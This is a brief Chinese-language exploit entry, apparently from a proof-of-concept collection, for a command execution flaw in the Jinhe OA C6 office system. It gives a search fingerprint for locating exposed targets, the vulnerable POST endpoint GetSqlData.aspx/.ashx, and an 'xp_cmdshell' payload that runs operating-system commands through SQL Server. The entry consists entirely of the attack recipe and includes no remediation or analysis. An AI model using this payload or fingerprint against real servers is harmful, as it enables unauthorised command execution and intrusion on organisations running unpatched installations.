# 金和OA-C6-service-命令执行漏洞

金和OA ｜ 命令执行 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1`

**Payload**
```
exec master..xp_cmdshell 'whoami'
```